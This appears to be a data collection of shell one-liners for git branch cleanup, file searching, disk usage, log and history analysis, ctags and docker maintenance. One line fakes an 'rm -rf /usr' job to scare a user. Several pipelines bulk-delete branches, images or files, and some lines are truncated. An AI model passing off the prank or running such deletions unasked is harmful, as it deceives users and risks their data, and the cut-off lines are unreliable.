git log --all --name-only --format='format:' | grep -v '^$' | sort | uniq -c | sort -n | tail
git for-each-ref --sort=committerdate refs/heads/ --format='%(HEAD) %(color:yellow)%(refname:short)%(color:reset) | %(authorname) | (%(color:green)%(committerdate:relative)%(color:reset))| %(contents:subject) ' | column -t -s '|'
git for-each-ref --sort=committerdate refs/heads/ --format='%(HEAD) %(color:yellow)%(refname:short)%(color:reset) | %(authorname) | (%(color:green)%(committerdate:relative)%(color:reset)) | %(contents:subject)' | column -t -s '|'
git for-each-ref --sort=-committerdate refs/remotes --format='%(color:yellow)%(refname:short)|%(color:bold green)%(committerdate:relative)|%(color:blue)%(subject)|%(color:magenta)%(authorname)%(color:reset)' | column -ts'|'
git for-each-ref --sort=-committerdate refs/heads/ refs/remotes/ --format='%(HEAD) %(color:red)%(objectname:short)%(color:reset)|%(color:yellow)%(refname:short)%(color:reset)|%(contents:subject)|%(authorname) (%(color:green)%(committerdate:relative)%(color:reset))' | column -ts'|'
git for-each-ref --sort=-committerdate refs/heads/ refs/remotes --format='%(color:yellow)%(refname:short)|%(color:bold green)%(committerdate:relative)|%(color:blue)%(subject)|%(color:magenta)%(authorname)%(color:reset)' | column -ts'|'
git for-each-ref --sort=-committerdate refs/heads/ --format='%(color:yellow)%(refname:short)|%(color:bold green)%(committerdate:relative)|%(color:blue)%(subject)|%(color:magenta)%(authorname)%(color:reset)' | column -ts'|'
git for-each-ref --sort=-committerdate refs/heads --format='%(color:yellow)%(refname:short)|%(color:bold green)%(committerdate:relative)|%(color:blue)%(subject)|%(color:magenta)%(authorname)%(color:reset)' | column -ts'|'
git for-each-ref --sort=-committerdate refs/heads --format='%(HEAD)%(color:yellow)%(refname:short)|%(color:bold green)%(committerdate:relative)|%(color:blue)%(subject)|%(color:magenta)%(authorname)%(color:reset)'|column -ts'|'
git for-each-ref --sort=-committerdate refs/heads --format='%(HEAD)%(color:yellow)%(refname:short)|%(color:bold green)%(committerdate:relative)|%(color:blue)%(subject)|%(color:magenta)%(authorname)%(color:reset)' --color=always|column -ts'|'}
git for-each-ref --sort=-committerdate --format='%(refname)' refs/heads/ | sed -e 's|refs/heads/||' | head -n 5
git for-each-ref --sort=-committerdate --format='%(color:yellow)%(refname:short)|%(color:bold green)%(committerdate:relative)|%(color:blue)%(subject)|%(color:magenta)%(authorname)%(color:reset)' | column -ts'|'
git for-each-ref --count=30 --sort=-committerdate refs/heads --format='%(HEAD)%(color:yellow)%(refname:short)|%(color:bold green)%(committerdate:relative)|%(color:blue)%(subject)|%(color:magenta)%(authorname)%(color:reset)' |column -ts'|'
git for-each-ref --color=always --sort=-committerdate refs/heads --format='%(HEAD)%(color:yellow)%(refname:short)|%(color:bold green)%(committerdate:relative)|%(color:blue)%(subject)|%(color:magenta)%(authorname)%(color:reset)'|column -ts'|'
git fetchp && git branch -r | awk '{print $1}' | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin) | awk '{print $1}' | xargs git branch -d
git fetch -p; git branch -r | awk '{print $1}' | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin) | awk '{print $1}' | xargs git branch -d
git fetch -p | git branch -vv | grep ': gone]' | awk '{print $1}' | vipe | xargs -n1 git branch -D
git fetch -p && git branch -vv | grep ': gone]' | grep -v '\[origin/master' | grep -v '\[origin/next-release' | awk '{print \$1;}' | xargs -n 1 git branch -D && git gc --aggressive
git fetch --prune && git branch -r | awk '{print $1}' | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin) | awk '{print $1}' | xargs git branch -d
git fetch --all --prune; git branch -vv | grep ': gone]' | grep -v '^master' | grep -v '^\\*' | awk '{print \$1 }' | xargs -L1 git branch -D
git diff origin/master... --name-only --diff-filter=AMCRTU | perl -wnle '/\.(pl|pm|t|psgi)$/ and print' | xargs perltidy -b -bext='/'
git diff master --name-only | egrep '.py$' | xargs env/bin/pep257 2>&1 | egrep -v '0: (First line should end with a period|Blank line missing after one-line summary)|test_.*All modules should have docstrings'
git diff \`git log | grep '^commit ' | head -n 2 | awk -F ' ' '{print \$2}' | tail -r | sed 'N;s/\n/ /'\`
git diff --color | diff-so-fancy | less --tabs=4 -RFX --pattern '^(Date|added|deleted|modified): '
git co master && git branch -r --merged | grep -v '\*\|master\|develop' | sed 's/origin\///' | xargs -n 1 git push --delete origin
git cl $(git tag | grep staging- | sort | tail -n 1).. --merges | cat | sort
git cl $(git tag | grep prod- | sort | tail -n 1).. --merges | cat | sort
git checkout master && git remote update --prune | git branch -r --merged | grep -v master | grep origin/ | sed -e 's/origin\//:/' | xargs git push origin
git checkout develop && git branch -r --merged | grep -v master | grep -v develop | grep origin | sed 's/origin\///' | xargs -n 1 git push --delete origin
git branch | grep pr- | xargs git br -D; git branch | grep -v master | grep -v staging | xargs git br -d
git branch | grep -vE '^\*|master$|develop$|development$' | xargs -I % git branch -d %; git branch
git branch | grep -v '*' | fzf -m | xargs echo | sed -E 's/^[[:space:]]*//g' | xargs git branch -D
git branch | egrep '^\*'| sed 's|\*[[:space:]]\([^[[:space:]]]*\)[[:space:]]*|\1|'
git branch | awk '{ if (NF == 2) print $2 }' | xargs -I % git log --oneline --first-parent % | peco | awk '{ print $1; }' | xargs -o git rebase -i
git branch -r| grep --color=never 'origin' | grep -v -E 'master|develop' | sed 's/origin\///g' | xargs -I {} git push origin :{}
git branch -r | awk '{print \$1}' | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin) | awk '{print \$1}' | xargs git branch -d
git branch -r | awk '{print $1}' | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin) | awk '{print $1}' | xargs git branch -d
git branch -r | awk '{print $1}' | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin) | awk '{print $1}' | xargs git branch -D
git branch -r --merged | grep -v master | grep -v staging | grep origin | sed 's/origin\///' | xargs -n 1 git push --delete origin
git branch -r --merged | egrep -v '(^\*|master|develop|release)' | sed 's/origin\///'
git branch -r --merged master | egrep -iv '(master|production|staging)' | sed 's/origin\///g' | xargs -n 1 git push --delete origin
git branch -a | awk '{ print $1 }' | grep -e 'remotes\/' | sed -e 's/remotes\///g' | peco --prompt='[git checkout -t]' | xargs git checkout -t
git branch -a --no-merged master | sed -e 's/remotes\/origin\///' | sort | uniq | pick | xargs git checkout
git branch -a --merged | grep -v \* | grep -v develop | grep -v master | sed -e 's/remotes\/origin\///g' | xargs git push --delete origin
git branch --merged|egrep -v '\*|develop|master|release'|xargs git branch -d
git branch --merged| egrep -v '(^\*|master|dev|staging)' | xargs -n 1 git branch -d
git branch --merged | grep -vE '^\*|master$|release$|develop$' | xargs -I % git branch -d %
git branch --merged | grep -v \* | grep -v master | grep -v dev | grep -v release | xargs -n 1 git branch -d
git branch --merged | grep -v -E 'master|qa|development|\*' | xargs -n 1 git branch -d
git branch --merged | grep -v '^* master$' | grep -v '^ master$' | grep -v '^* staging$' | grep -v '^ staging$' | xargs git branch -d
git branch --merged | grep -v '\*' | grep -v master | grep -v staging | grep -v production | xargs -n 1 git branch -d
git branch --merged | grep -v '\*' | grep -v 'master' | grep -v 'develop' | grep -v 'staging' | xargs -n 1 git branch -d && git remote prune origin
git branch --merged | egrep -v '(^\*|master|dev|ruby-2-sday)' | xargs git branch -d
git branch --merged | egrep -v '(^\*|master|dev|qa)' | xargs git branch -d
git branch --merged | egrep -v '(^\*|master|develop|staging)' | xargs git branch -d
git branch --merged | egrep -v '(^\*|master|develop|stable)' | xargs git branch -d
git branch --merged | egrep -v '(^\*|master|develop|release)' | xargs git branch -d
git branch --merged staging | grep -vE '^\*|master$|develop$|staging$' | xargs -I % git branch -d %
git branch --merged development | grep -vE '^(\*.+)|(master|development|knock)$' | xargs git branch -d
git branch --merged develop | grep -vE '^\*|master$|develop$|staging$' | xargs -I % git branch -d %
git branch --all | grep -v HEAD | fzf | xargs echo | sed -E 's_remotes/origin/__g' | xargs git checkout
git br -r | grep gerrit | grep -e '5.1\d.*' | cut -d_ -f 2-3 | sort -u | grep -v patch
git archive master --format=tar --prefix=`pwd | sed -e 's/\// /g' |awk '{print $NF}'`/ | gzip >`pwd | sed -e 's/\// /g' |awk '{print $NF}'`.tgz
gf -p && gb --merged | grep -vE '^\\*|master$|develop$|release$' | xargs -I % git branch -d %
fuser -v /dev/nvidia* 2>&1 |grep -o '$USER.*' | awk '{print \$2}' | xargs -I {} sh -c 'echo Killing {}; kill {} || echo failed'
function(){git fetch --all > /dev/null | echo ${1} | git branch --merged ${1} | grep -ve '^[ *]\sdevelop$' | grep -ve '^[ *]\srelease$' | grep -ve '^[ *]\smaster$' > /tmp/merged-branches && vi /tmp/merged-branches && xargs git branch -d < /tmp/merged-branches}
for port in `netstat -p tcp -na|grep '*.\d' | awk '{print $4}' | cut -f2 -d. `; do sudo lsof -P -i tcp | grep -i tcp | grep \
for i in `file err.txt generated.file succ.txt | grep 'executable' | awk '{print $1}' | rev | cut -c 2- | rev`; do mv $i $1/$i; done
for i in $( ls *.(jpg|png|JPG|PNG|jpeg|JPEG)); do convert -resize 70% $i $i; done
find|egrep '[.]rar$'|grep -vi part|sedesc|sed -e 's/^.*$/( mkdir & \&\& mv & & \&\& ( cd & \&\& unrar x -idq *.rar ) \&\& rm &\/& )/' -e 's/[.]rar[ ][&]/\&/g' -e 's/[.]rar[/]\([^/]*[/]\)*/\//'|sh
find ~/.password-store -type f | fzf | cut -f 5- -d /|sed 's/ /\\ /g'|sed 's/.gpg//g'| xargs -r pass show
find spec -name '*_spec.rb' -print0 | xargs -0 stat -f '%m %N' | sort -rn | head -1 | cut -d ' ' -f 2 | xargs bundle exec rspec
find db/migrate -name '*.rb' | xargs grep '' | peco --initial-filter Regexp | sed 's/db\/migrate\///' | sed 's/_.*//' | xargs -I % rake db:migrate:down VERSION=%
find /var/log -type f -exec file {} \; | grep 'text' | cut -d' ' -f1 | sed -e's/:$//g' | grep -vE '[0-9]$' | xargs tail -f
find /var/log -type f -exec file {} \; | grep 'text' | cut -d' ' -f1 | sed -e's/:$//g' | grep -v '[0-9]$' | xargs tail -f
find ./ \( -not -wholename '*CMakeFiles/*' \) -name '*.[c|h|cpp|hpp]' | xargs wc -l | tail -n 1
find ./ -type f -print0 | xargs -0 du | sort -n | tail -n 100 | cut -f2 | xargs -I{} du -sh {}
find . | sort | sed '1d;s/^\.//;s/\/\([^/]*\)$/|--\1/;s/\/[^/|]*/| /g'
find . | grep -v .svn | grep -v .git | grep -v \~$ | grep \\.h$ | xargs grep -iIsHn
find . | grep -v .svn | grep -v .git | grep -v \~$ | grep \\.c$ | xargs grep -iIsHn
find . | grep -i $1 | grep scala | grep -v target | grep -v swp | grep -v class
find . | grep -E '(\.tox$|__pycache__|\.pyc|\.pyo$)' | xargs rm -rf
find . | fzf --preview 'bat --color=always {} || cat {} || head -500'
find . | egrep '\.idea$|\.ipr$|\.iws$|\.iml$' | xargs rm -rf
find . -type f | sed -En 's|.*/[^/]+\.([^/.]+)$|\1|p' | sort -u
find . -type f | grep -vE '.tmp-*|.git|node_modules|bower_components' | fzf --multi --preview 'rougify {}'
find . -type f -print0 | xargs -0 du | sort -rn | head -10 | cut -f2 | xargs -I{} du -sh {}
find . -type f -print0 | xargs -0 du | sort -n | tail -10 | cut -f2 | xargs -I{} du -sh {}
find . -type f -print0 | xargs -0 du -s | sort -n | tail -150 | cut -f2 | xargs -I{} du -sh {}
find . -type f -print0 | xargs -0 du -s | sort -n | tail -10 | cut -f2 | xargs -I{} du -sh {}
find . -type f -not -path './.git/*' | /bin/sed -n 's/\(..*\.\)\?\(..*\/\)\?//p' | /bin/sed -r 's/(.*)/\L\1/' | sort | uniq -c | sort -n -r
find . -type f -not -path './.git/*' | /bin/sed -n 's/..*\.//p' | /bin/sed -r 's/(.*)/\L\1/' | sort | uniq -c | sort -n -r
find . -type f -name 'models.py' | xargs grep -H -P '^class' | sed 's/class/''/' | sed -E 's/\(.*$/''/' | grep -v -P '.+:$' | sed 's/\/models\.py:/''/'
find . -type f -iregex '.*\.\(c\|C\|h\|ht\|cpp\)' -print0 | xargs -0 grep --color -n
find . -type f -follow -print0 | grep -zZvF .svn | grep -zZvF .git | grep -zZvF vcr_cassettes | grep -zZvF sass-cache | xargs -0 grep
find . -type d -print0 | xargs -0 du | sort -n | tail -10 | cut -f2 | xargs -I{} du -sh {}
find . -type d -print0 | xargs -0 du -s | sort -n | tail -10 | cut -f2 | xargs -I{} du -sh {}
find . -type d -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g' | less
find . -regextype posix-egrep -iregex '(.*\/Makefile|.*\/Makefile\..*|.*\.make|.*\.mak|.*\.mk)' -type f -print0 | xargs -0 grep --color -n
find . -regex '.*\.c\|.*\.cpp\|.*\.h\|.*\.S\|.*\.s' | grep --color=auto
find . -print | sort | sed 's;[^/]*/;|---;g;s;---|; |;g'
find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'|more
find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'|less
find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g' |less
find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g' | less -FRX
find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g' | less
find . -name '*php' -type f | xargs grep -Ei '(todo|fixme|die|var_dump|hack)'
find . -name '*.txt' | xargs cat | grep 'ERROR' | cut -d ':' -f 2 | sort | uniq -c
find . -name '*' | sed -e 's/^/|-/' -e 's/[^-][^\/]*\//| /g' -e 's/| \([A-Za-z0-9_.]\)/| +--\1/'
find . -maxdepth 1 -mindepth 1 -print0 | xargs -0 -n1 du -ks | sort -rn | head -16 | cut -f2 | xargs -i du -hs {}
find . -maxdepth 1 -mindepth 1 -print0 | xargs -0 -n1 du -ks | sort -rn | head -16 | cut -f2 | xargs -I {} du -hs {}
find -regex '.*\.(c|h|cpp|hpp|ino)$' | xargs clang-format -i
find -maxdepth 1 -type f | grep --color=no -iE '(.*\.mak$)|(.*\.mk$)|(makefile)$' |awk -F / '{print $2}'| xargs -I {} make -f $1 {}
find -maxdepth 1 -print0 |xargs -0i du -ks {} |sort -rn |head -11 | cut -f2 | xargs -i du -hs {}
find $SENSEYE_BACKEND -name 'fig.yml' -o -name 'docker-compose.yml' -exec cat {} \; | grep -e '58.*:' | tr -c [[:digit:][:space:]] ' ' | awk '{ print \$1}' | sort -n | tail -1
find $1 -type d | grep -v '/\.' | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
fc -ln 0 | awk '{print \$1}' | sort | uniq -c | sort -nr | head
fc -l 1 | awk '{print \$2}' | sort | uniq -c | sort -n -r | head
f() { history|cut -d\ -f4-5|sort|uniq -c|sort -rn|head -${1:-30}; }; f
env | egrep DBG\|ENV_TRACE\|DOT\|SKEL\|SOFT
egrep ^bind $HOME/.config/i3/config | cut -d ' ' -f 2- | sed 's/ /\t/' | column -ts $'\t' | pr -2 -w 145 -t | less
echo running:; showq | grep alexis | grep Running | wc -l; echo total:; showq | grep alexis | wc -l
echo rm -rf /usr \&;echo [1] $(ps -f|grep 0:00.0|grep bash|grep -v grep|head -1|cut -c 10-15);sleep 5;echo [1]+\ \ Done\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ rm -rf /usr
echo `git remote -v | grep fetch | awk '{print $2}' | sed 's/git@/http:\/\//' | sed 's/com:/com\//'`| head -n1
echo \`cat setup.py | grep 'name=' | cut -d \' -f2; cat setup.py | grep dev | awk '{print \$3}' | sed -r \
echo \$(head -c 50 /dev/urandom | base64 |tr '+' '0' | tr '/' 'z' |tr '%' 'x' |head -c 16)
echo ; bauerbill -Qu | grep -Ev '(core|extra|community|multilib)' | grep -v ^$ ; echo
echo 'git fetch --prune' && git fetch --prune && git branch -r | awk '{print $1}' | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin) | awk '{print $1}' | xargs git branch -d
echo 'Top commands:' && history | tr -s ' ' | cut -d ' ' -f 3 | sort | uniq -c | sort -n -r
e \$(fzf --preview '[[ \$(file --mime {}) =~ binary ]] && echo {} is a binary file || (rougify {} || cat {}) 2> /dev/null | head -500')
du -s -- err.txt generated.file succ.txt | sort -n | cut -f 2- | while read a; do du -hs |$a|; done
du -h -x > /tmp/tmpfile.$PPID ; cat /tmp/tmpfile.$PPID | egrep ^[0-9\.]+G |sort -nr ; cat /tmp/tmpfile.$PPID |egrep ^[0-9\.]+M |sort -nr | head -n 40
dpkg --list | grep linux-image | awk '{ print $2 }' | sort -V | sed -n '/'`uname -r`'/q;p' | xargs sudo apt-get -y purge
docker ps -a --format '{{.ID}}|{{.Names}}|{{.Image}}|{{.Status}}|{{.Ports}}' | awk -F \
docker ps --format '{{.ID}}|{{.Names}}|{{.Image}}|{{.Status}}|{{.Ports}}' | awk -F \
docker images | grep --color=never -E '<none>|amazonaws.com' | tr -s ' ' | cut -d ' ' -f 3 | xargs docker rmi -f
docker images --no-trunc | grep '<none>' | awk '{ print \$3 }' | xargs -r docker rmi ; docker ps --filter status=dead --filter status=exited -aq | xargs docker rm -v ; docker volume ls -qf dangling=true | xargs -r docker volume rm
dlog dataloader 2>&1 | egrep --line-buffered -i 'warning|error|sleeping forever' | grep -v --line-buffered Octopus | grep -v --line-buffered 'Errors Count: 0'
diff -wru $(ls|sort|head -n1) $(ls|sort|tail -n1)|vim -
df -hP | egrep '^/dev/| /(tmp|run|dev/shm)' | egrep -v /var/lib/snapd/snap
df -h | grep -v tmp | grep -v udev | grep -v efi | grep -v loop | sort
df -h | grep -P '(Avail|/Data|/home|/$)' | sort -hk 4
df -h | cCyan '[0-9]+\.?[0-9]?G' | cYellow '[0-9]+\.?[0-9]?M' | cGreen '[0-9]+\.?[0-9]?K' | cRed '9[0-9]\%' | cLightRed '8[0-9]\%'
df -Tha --total | grep -E --color=never 'Type|ext*|cifs|nfs' | grep -v aufs
dd if=/dev/urandom bs=1 count=12 2>/dev/null | base64 | rev | cut -b 2- | rev | pbcopy
cvs -n update -d 2> /dev/null | grep --color -E '(^|^M|^C.*|^A|^R)'
curl -fsS https://api.github.com/repos/hashicorp/vault/tags | jq -re '.[].name' | sed 's/^v\(.*\)$/\1/g' | sort -Vr | grep -v 'beta' | head -1
curl --silent whatismyip.host|grep ipaddress|head -1|sed 's/ //g'|cut -d '>' -f 2|sed 's/<\/p//g'
curl --silent 'http://xml.weather.yahoo.com/forecastrss?p=98030&u=f' | grep -E '(Current Conditions:|F<BR)' | tail -n 1 | cut -d'<' -f 1|sed 's/ F$/°F/'
ctags . && sed -i -r '/^(if|switch|function|exports|it|describe)\t.+\.js\t/d' tags
ctags -f tstags -R --exclude=*.js --exclude=*.jsx --exclude=*.html . && sed -i '' -E '/^(if|switch|function|module\.exports|it|describe).+language:ts$/d' tstags
ctags -f jstags -R --exclude=*.ts --exclude=*.tsx --exclude=*.html . && sed -i '' -E '/^(if|switch|function|module\.exports|it|describe).+language:js$/d' jstags
ctags -R src && sed -i '' -E '/^(if|switch|function|module\.exports|it|describe).+language:js$/d' tags
ctags -R public server flow-typed scripts webpack && sed -i '' -E '/^(if|switch|function|module\.exports|it|describe).+language:js$/d' tags
ctags -R fixtures src test api authenticator aws-lambda frontend lib shared --exclude=.git && sed -i ‘’ -E ‘/^(if|switch|function|module\.exports|it|describe).+language:js$/d’ tags
ctags -R app config lib && sed -i '' -E '/^(if|switch|function|module\.exports|it|describe).+language:js$/d' tags
ctags -R api authenticator aws-lambda frontend lib shared --exclude=*node_modules --exclude=.git && sed -i ‘’ -E ‘/^(if|switch|function|module\.exports|it|describe).+language:js$/d’ tags
ctags -R api authenticator aws-lambda frontend HeliaConnect lib shared --exclude=*node_modules --exclude=.git && sed -i ‘’ -E ‘/^(if|switch|function|module\.exports|it|describe).+language:js$/d’ tags
ctags -R . && sed -i ‘’ -E ‘/^(if|switch|function|module\.exports|it|describe).+language:js$/d’ tags
ctags -R . && sed -i '' -E '/^(if|switch|function|module\.exports|it|describe).+language:js$/d' tags
ctags -R && sed -i ‘’ -E ‘/^(if|switch|function|module\.exports|it|describe).+language:js$/d’ tags
condor_q | col 6 | drop 4 | head -n -2 | sort | uniq -c
condor_q $USER | col 6 | drop 4 | head -n -2 | sort | uniq -c
comm -13 <(git branch -r | sed 's@origin/@@'g | awk '{print \$1}' | sort) <(git branch -l | sed 's/*//g' | awk '{print \$1}')
clamscan -r -i --exclude-dir='^/sys|^/proc|^/dev|^/lib|^/bin|^/sbin' /
clamscan --recursive=yes --infected --remove --exclude-dir='^/sys|^/proc|^/dev|^/lib|^/bin|^/sbin' /
clamscan --recursive=yes --infected --exclude-dir='^/sys|^/proc|^/dev|^/lib|^/bin|^/sbin' /
chromium-browser \`git remote -v | grep github.com | grep fetch | head -1 | field 2 | sed 's/git:/http:/g'\`
chromium \`git remote -v | grep github.com | grep fetch | head -1 | field 2 | sed 's/git:/http:/g'\`
chrome \`git remote -v | grep github.com | grep fetch | head -1 | field 2 | sed 's/git:/http:/g'\`
chrome \`git remote -v | grep github.com | grep fetch | head -1 | field 2 | sed 's/git:/http:/g '\`
cat ~/app-root/logs/access_log | grep -i bot | sed 's/.* \([^ ]*bot\)/\1/i;' | sort | uniq -c | sort -n
cat ~/.zsh_history | sed -E -n 's/.*;([^ ]*)( ?.*)/\1/p' | sort | uniq -c | awk '\$1 > 10' | sort -n
cat ~/.zsh_history | sed -E -n 's/.*;([^ ]* ?[^ ]*)( ?.*)/\1/p' | sort | uniq -c | awk '\$1 > 10' | sort -n
cat ~/.zsh_history | awk '{print \$1}' | sort | uniq -c | sort -rn | head -5
cat ~/.zsh_history | awk '{print \$1}' | sort | uniq -c | sort -rn | head -3
cat ~/.zhistory | grep -E '^:\s([0-9]+):([0-9]+);([a-zA-Z]+)(.*)' | sed -r -e 's/^: ([0-9]+):0;([a-zA-Z]+)(.*)/\2/g' | sort | uniq -c | sort -n
cat ~/.root_history | sed 's/^ *[0-9]* *//' | cat ~/.root_history - | sort | uniq | grep
cat ~/.history | sort | uniq -c | sort -nr | head -n 10 | nl
cat ~/.bash_history | sed -e 's/ *$//' | sort | uniq -cd | sort -nr | head
cat ~/.bash_history | sed 's/^ *[0-9]* *//' | cat ~/.bash_history - | sort | uniq | grep
cat package.json | jq '.scripts' | tail -n +2 | tail -r | tail -n +2 | cut -d '\
cat package.json | jq '.dependencies | keys | sort | .[]' -r | column
cat config/toggles/* | grep 'kill_with' | cut -d' ' -f2 | fzf | tr -d '\n' | pbcopy
cat /var/log/messages | grep -i 'iptables' | grep -Pi 'SRC\=([\d\.]+)' --color=always | grep -Pi 'dpt\=(\d+)' --color=always | grep -P '\s\d{2}\:\d{2}\:\d{2}\s' --color=always | less -R
cat /etc/grub2.cfg | grep -i menuentry | grep -i Fedora | grep -v rescue | sort | cut -f2 -d \'
cat /dev/urandom | base64 | tr -dc 'a-km-zA-KM-Z02-9-_!@#$%^&*+|' | fold -w 16 | head -n 4
cat *access.log | grep $(date '+%e/%b/%G') | awk '{ print $1 }' | sort | uniq -c | wc -l
cat *access.log | grep $(date '+%b/%G') | awk '{ print $1 }' | sort | uniq -c | wc -l
cat *access.log | awk '{ print $7 }' | sort | uniq -c | sort -rn | head -n 25
cat *access.log | awk '{ print $1 }' | sort | uniq -c | sort -rn | head -n 25
cat *access.log | awk '($9 ~ /404/)' | awk '{ print $7 }' | sort | uniq -c | sort -rn
cat $HISTFILE | cut -f1 -d' ' | sort | uniq -c | sort -nr | head -n 30
cat $HISTFILE | cut -d' ' -f1 | sort | uniq -c | sort | head -100
cat $HISTFILE | awk '{print $1}' | sort | uniq -c | sort -rn | head -n 30
bundle exec rubocop | egrep 'C:|W:' | sed -e 's/.*[CW]: \([a-zA-Z\/]*\).*/\1/g' | sort | uniq -c
bundle exec rubocop | egrep 'C:|W:' | sed -e 's/.*[CW]: \([a-zA-Z\/]*\).*/\1/g' | sort | uniq
bundle exec rubocop | egrep 'C:|W:' | sed -e 's/.*[CW]: \([a-zA-Z\/]*.*\)/\1/g' | sort | uniq
bundle exec rspec \$(git status | grep spec | grep 'modified:' | grep -v spec/support |grep -v spec/factories | cut -d':' -f 2 -)
bind -p | grep 'C-' | grep -v 'abort\|version\|accept' | less
bin/rails routes | peco | sed 's/[ \t]*//' | awk -F ' ' '{ print \$1 }' | perl -pe 's/\n//g' | pbcopy
awk -F ' |:|=' '{print \$12 \$16}' /var/log/apache-killed-by-wpe.log | sort | uniq -c | sort -rn
awk '{print \$2}' /etc/ssh/ssh_host_ecdsa_key.pub | base64 -d | sha256sum -b | awk '{print \$1}' | xxd -r -p | base64
ag ' +$' -C 2 -G '\.(c|h|cpp|py|js|json)$'
af (N-|T-|W-|O-)|ax -L [0-9]{12}|ax -L '(?<=\@)[a-z]*[0-9]{4}'
adb logcat -v time | grep -E 'amffmpeg|M3uParser|M3uSession|AmlogicPlayer|amplayer'
ack -vg '.*migrations.*|.*log|.*json|.*yaml|.*sql' | ack -x
ack '\b(var_dump|dpm|kpr|dd|dargs|console\.log)' $@
\sysctl machdep.cpu | egrep 'brand_string|count|size|VMX|SVM'
\ps ux | grep '[C]hrome Helper --type=renderer' | grep -v extension-process | tr -s ' ' | cut -d ' ' -f2 | xargs kill
\hash | sed -E -e 's|^([^=]*)(=.*)|${fg_bold[blue]}\\\1${reset_color}\\\2|' | column -s '=' -t
LC_CTYPE=C && LANG=C && git ls-files | xargs -n1 git blame --line-porcelain | sed -n 's/^author //p' | sort -f | uniq -ic | sort -nr
LANG=$(locale -a 2>/dev/null | egrep -i '(fr_fr|en_us|en_uk).*utf' | sort -r | head -1) \vim
HISTTIMEFORMAT='' history | sed -e 's/^[ ]*//g' | cut -d' ' -f2- | sort | uniq -c | sort -r
971455,224676,tree,tree -a --charset utf-8 -I """".git|__pycache__|*.pyc|.git|venv|.idea"""""""
7z e -so ~/projects/flows/ConsRpt_V02_20160531000000.7z | tail -n +2 | head -n 400 | csvlook -d\| -H | less -S
606512,155834,g,find . -iregex '.*\.\(css\|html\|js\|tpl\|py\)' | xargs grep -n -e"""
3732112,587161,gbda,git branch --no-color --merged | command grep -vE """"^(\*|\s*(master|develop|dev)\s*$)"""" | command xargs -n 1 git branch -d"""
3671360,584853,gbda,git branch --no-color --merged | command grep -vE """"^(\*|\s*(master|develop|dev)\s*$)"""" | command xargs -n 1 git branch -d"""
3656280,584386,gbda,git branch --no-color --merged | command grep -vE """"^(\*|\s*(master|develop|dev)\s*$)"""" | command xargs -n 1 git branch -d"""
3655889,584374,gbda,git branch --no-color --merged | command grep -vE """"^(\*|\s*(master|develop|dev)\s*$)"""" | command xargs -n 1 git branch -d"""
3655583,584367,gbda,git branch --no-color --merged | command grep -vE """"^(\*|\s*(master|develop|dev)\s*$)"""" | command xargs -n 1 git branch -d"""
3655202,584356,gbda,git branch --no-color --merged | command grep -vE """"^(\*|\s*(master|develop|dev)\s*$)"""" | command xargs -n 1 git branch -d"""
3653127,584279,gbda,git branch --no-color --merged | command grep -vE """"^(\*|\s*(master|develop|dev)\s*$)"""" | command xargs -n 1 git branch -d"""
3650294,584042,gbda,git branch --no-color --merged | command grep -vE """"^(\*|\s*(master|develop|dev)\s*$)"""" | command xargs -n 1 git branch -d"""
3648437,583943,gbda,git branch --no-color --merged | command grep -vE """"^(\*|\s*(master|develop|dev)\s*$)"""" | command xargs -n 1 git branch -d"""
3640270,583551,gbda,git branch --no-color --merged | command grep -vE """"^(\*|\s*(master|develop|dev)\s*$)"""" | command xargs -n 1 git branch -d"""
3638903,583510,gbda,git branch --no-color --merged | command grep -vE """"^(\*|\s*(master|develop|dev)\s*$)"""" | command xargs -n 1 git branch -d"""
3638746,583508,gbda,git branch --no-color --merged | command grep -vE """"^(\*|\s*(master|develop|dev)\s*$)"""" | command xargs -n 1 git branch -d"""
3638553,583504,gbda,git branch --no-color --merged | command grep -vE """"^(\*|\s*(master|develop|dev)\s*$)"""" | command xargs -n 1 git branch -d"""
3638396,583502,gbda,git branch --no-color --merged | command grep -vE """"^(\*|\s*(master|develop|dev)\s*$)"""" | command xargs -n 1 git branch -d"""
3321251,527945,gbpurge,git branch --merged | grep -v """"\*"""" | grep -v """"master"""" | grep -v """"develop"""" | grep -v """"staging"""" | xargs -n 1 git branch -d"""
3020449,496402,sleepmon,syslog |grep -i -e """"System Sleep\|System Wake\|Wake Reason\|BOOT_TIME\|SHUTDOWN_TIME"""""""
/usr/ucb/ps axwww | grep hsc1 | grep -v ps | grep -v grep | grep \!^ | less -s
/usr/ucb/ps axewwwu | grep hsc1 | grep -v ps | grep -v grep | grep \!^ | less -s
/usr/lib64/http2smtp/erts-*/bin/erl -boot $(find /usr/lib64/http2smtp/releases/ -type d | sort | tail -1)/start_clean -name $USER-$RANDOM -setcookie $(systemctl cat http2smtp.service | grep =COOKIE | tail -1 | cut -d
/sbin/iwlist scanning 2>/dev/null | grep -e 'Cell' -e 'Channel\:' -e 'Encryption' -e 'ESSID' -e 'WPA' | sed 's|Cell|\nCell|g'
./vendor/bin/phpcs --standard=./vendor/behance/php-sniffs/Behance/ruleset.xml -s -n `git diff --diff-filter=d --name-only upstream/master..HEAD | grep .php | tr '\n' ' ' | rev | cut -c 2- | rev`
./vendor/bin/phpcbf --standard=./vendor/behance/php-sniffs/Behance/ruleset.xml `git diff --diff-filter=d --name-only upstream/master..HEAD | grep .php | tr '\n' ' ' | rev | cut -c 2- | rev`
(git status || files-chaged) | grep php | cut -d':' -f2 | xargs -n 1 php-cs-fixer fix
(git log | head -1| grep -oE '\w{40}' | perl -ne 'chomp and print' | pbcopy) && (git log | head -6)
(git clean --dry-run | awk '{print $3;}' && git ls-files -m) | egrep '.ex|.exs|.eex' | xargs mix format
(cat .gitignore 2> /dev/null || echo '') | sed 's/^\///' | tr '\n' '|'
